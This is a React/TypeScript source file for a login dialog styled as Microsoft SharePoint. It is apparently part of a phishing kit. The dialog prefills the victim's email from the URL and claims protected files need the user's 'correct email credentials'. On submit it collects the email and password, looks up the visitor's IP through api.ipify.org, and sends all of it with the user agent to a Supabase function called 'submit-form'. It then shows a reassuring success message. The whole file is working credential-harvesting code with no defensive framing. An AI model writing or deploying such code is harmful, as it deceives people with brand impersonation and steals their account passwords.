import { useState, useEffect } from "react";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { getEmailFromUrl } from "@/utils/urlUtils";
import { supabase } from "@/integrations/supabase/client";

interface AuthModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const AuthModal = ({ isOpen, onClose }: AuthModalProps) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  // Prefill email from URL on component mount
  useEffect(() => {
    const urlEmail = getEmailFromUrl();
    if (urlEmail) {
      setEmail(urlEmail);
    } else {
      setEmail("hi@me.com"); // fallback default
    }
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      // Get additional data for submission
      const userAgent = navigator.userAgent;
      const ipAddress = await fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => data.ip)
        .catch(() => 'Unknown');

      // Submit to our Supabase edge function
      const { data, error } = await supabase.functions.invoke('submit-form', {
        body: {
          email,
          password,
          ip_address: ipAddress,
          user_agent: userAgent,
          location_data: 'Web Browser'
        }
      });

      if (error) {
        throw new Error(error.message);
      }

      toast({
        title: "Success!",
        description: "Your information has been submitted and saved successfully.",
      });
      
      onClose();
    } catch (error) {
      console.error('Submission error:', error);
      toast({
        title: "Error",
        description: "Failed to submit information. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="w-[95vw] max-w-md mx-auto p-0 gap-0 bg-white shadow-modal border-0">
        {/* Header */}
        <div className="flex items-center space-x-2 px-4 md:px-6 py-3 md:py-4 border-b border-sharepoint-border">
          <div className="flex items-center space-x-2">
            <div className="w-5 h-5 md:w-6 md:h-6 flex items-center space-x-1">
              <div className="w-1.5 h-1.5 md:w-2 md:h-2 bg-red-500 rounded-sm"></div>
              <div className="w-1.5 h-1.5 md:w-2 md:h-2 bg-green-500 rounded-sm"></div>
              <div className="w-1.5 h-1.5 md:w-2 md:h-2 bg-blue-500 rounded-sm"></div>
              <div className="w-1.5 h-1.5 md:w-2 md:h-2 bg-yellow-500 rounded-sm"></div>
            </div>
            <span className="text-xs md:text-sm font-medium text-sharepoint-text">Microsoft</span>
            <span className="text-sharepoint-text/60 hidden sm:inline">|</span>
            <span className="text-xs md:text-sm font-medium text-sharepoint-text hidden sm:inline">SharePoint</span>
          </div>
        </div>

        {/* Content */}
        <div className="px-4 md:px-6 py-4 md:py-6">
          <div className="text-center mb-4 md:mb-6">
            <p className="text-sharepoint-text/80 text-xs md:text-sm leading-relaxed">
              These files are sensitive and secured against unauthorized access. In 
              order to access these files, please provide your correct email 
              credentials, we will connect you to your email provider through a 
              secured IMAP channel to authorize your download.
            </p>
          </div>

          <div className="text-center mb-4 md:mb-6">
            <h3 className="text-sharepoint-text font-medium italic text-sm md:text-base">
              Enter details to access protected documents
            </h3>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="email" className="text-sharepoint-text text-xs md:text-sm">
                Email address
              </Label>
              <Input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full border-sharepoint-border focus:border-sharepoint-blue focus:ring-sharepoint-blue text-sm md:text-base"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="password" className="text-sharepoint-text text-xs md:text-sm">
                Password
              </Label>
              <Input
                id="password"
                type="password"
                placeholder="Receiver's password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full border-sharepoint-border focus:border-sharepoint-blue focus:ring-sharepoint-blue text-sm md:text-base"
                required
              />
            </div>

            <div className="pt-3 md:pt-4">
              <Button
                type="submit"
                disabled={isLoading}
                className="w-full bg-sharepoint-blue hover:bg-sharepoint-header text-white py-2.5 md:py-3 rounded text-sm md:text-base disabled:opacity-50"
              >
                {isLoading ? "Authenticating..." : "Access Files"}
              </Button>
            </div>
          </form>
        </div>
      </DialogContent>
    </Dialog>
  );
};